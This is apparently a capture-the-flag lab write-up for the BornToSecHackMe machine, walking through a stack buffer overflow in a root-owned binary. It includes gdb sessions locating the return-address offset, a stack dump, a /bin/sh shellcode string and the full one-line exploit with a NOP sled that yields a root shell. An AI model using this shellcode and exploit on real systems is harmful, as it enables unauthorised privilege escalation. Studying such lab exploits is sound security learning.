###Buffer Overflow to Run Root Shell in zaz
Once we get in zaz we are left with a folder and a executable owned by root
with ghidra we find out that the main function is using strstr with a buffer of 140 which are the perfect ingredients to attempt a buffer overflow and run a root shell.

![alt text](.git/Buffer_overflow_basicexample.png)

1. Write past array buffer ending.
2. Find where we want our address to return to (somewhere in the NOP region).
3. Overwrite return address at EIP with our address.
4. Don’t write past EIP!

![alt text](.git/hacked_stack.png)


We have to find how much buffer we got before we run into the eip for that we will first find the point in which we start overriding it


If we print exacly the buffer size 140 we get 0xb7e45400 as the eip
```
zaz@BornToSecHackMe:~$ gdb -q --args ./exploit_me `python -c 'print "A"*140'`
Reading symbols from /home/zaz/exploit_me...(no debugging symbols found)...done.
(gdb) run
Starting program: /home/zaz/exploit_me AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGILL, Illegal instruction.
0xb7e45400 in __libc_start_main () from /lib/i386-linux-gnu/libc.so.6
(gdb) info reg eip
eip            0xb7e45400	0xb7e45400 <__libc_start_main+32>
(gdb) 

```

But if then we go up with 141 we get 0xb7e40041 as the eip, as you can see it changed and now it displays a 41 at the end, that 41 is the hexadecimal value of the A character we are using to overflow the buffer, that means that is starting to write on it.

```
zaz@BornToSecHackMe:~$ gdb -q --args ./exploit_me `python -c 'print "A"*141'`
Reading symbols from /home/zaz/exploit_me...(no debugging symbols found)...done.
(gdb) run
Starting program: /home/zaz/exploit_me AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0xb7e40041 in ?? () from /lib/i386-linux-gnu/libc.so.6
(gdb)
```

So if we go up to 144 we completely fill up the direction. 

```
zaz@BornToSecHackMe:~$ gdb -q --args ./exploit_me `python -c 'print "A"*144'`
Reading symbols from /home/zaz/exploit_me...(no debugging symbols found)...done.
(gdb) run
Starting program: /home/zaz/exploit_me AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) info reg eip
eip            0x41414141	0x41414141
(gdb) 
```

Once we are here if we replace the last 4 letters to "BCDE" (42 43 44 45 in hexadecimal) we can see that the eip value gets to be 0x45444342 so that let us make sure that right there we have the limit we dont want to surpass when doing the overflow attack.


```
zaz@BornToSecHackMe:~$ gdb -q --args ./exploit_me `python -c 'print "A"*140 + "BCDE"'`
Reading symbols from /home/zaz/exploit_me...(no debugging symbols found)...done.
(gdb) run
Starting program: /home/zaz/exploit_me AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDE
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDE

Program received signal SIGSEGV, Segmentation fault.
0x45444342 in ?? ()
(gdb
```

What we are going to do next is to use the gdb command  x/32x $esp which is a command that displays 32 words at the top of the stack in hex 
and we will use it to look for the memory directions we need.
If we look around we will find all the 41's in the memory that come from our printing 'A' command, so now we know that, that is the buffer and the space we have to work in.
We will keep the memory address of the begining of the buffer 0xbffff7c0 as we will use it as our return address.

```
0xbffff750:	0x000003ed	0x0000000e	0x000003ed	0x00000017
0xbffff760:	0x00000001	0x00000019	0xbffff78b	0x0000001f
0xbffff770:	0xbfffffe7	0x0000000f	0xbffff79b	0x00000000
0xbffff780:	0x00000000	0x00000000	0x12000000	0xe5895422
0xbffff790:	0x7d873afa	0x01ca55fb	0x697698fb	0x00363836
0xbffff7a0:	0x00000000	0x00000000	0x682f0000	0x2f656d6f
0xbffff7b0:	0x2f7a617a	0x6c707865	0x5f74696f	0x4100656d
0xbffff7c0:	0x41414141	0x41414141	0x41414141	0x41414141
(gdb) 
0xbffff7d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff7e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff7f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff800:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff810:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff820:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff830:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff840:	0x41414141	0x41414141	0x42414141	0x00454443
(gdb) 
0xbffff850:	0x505f434c	0x52455041	0x5f72663d	0x552e5246
0xbffff860:	0x382d4654	0x5f434c00	0x52444441	0x3d535345
0xbffff870:	0x465f7266	0x54552e52	0x00382d46	0x4d5f434c

```

What we will use to execute the shell is a shellcode

"\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"

This string contains the assembly code necesary to execute /bin/sh

Now we just need to measure the size of the shellcode we are going to use which is 53.


we can simply use python and do len("\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")

Then we do some simple math, the buffer is 140 and the shell is 53 --> 140 - 53 = 87
So then the NOP slide is going to be of the size of 87 so that the shell gets in the proper spot.
It will look something like this

```
zaz@BornToSecHackMe:~$ ./exploit_me `python -c 'print "\x90"*87 + "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\xd0\xf7\xff\xbf"'`
���������������������������������������������������������������������������������������1�1۰̀�^�1��F�F
                                                                                                    �
                                                                                                     ���V
                                                                                                         1ۉ�@̀�����/bin/sh����
# whoami
root
# 

```

And there you go! we just got to open a shell with root!!
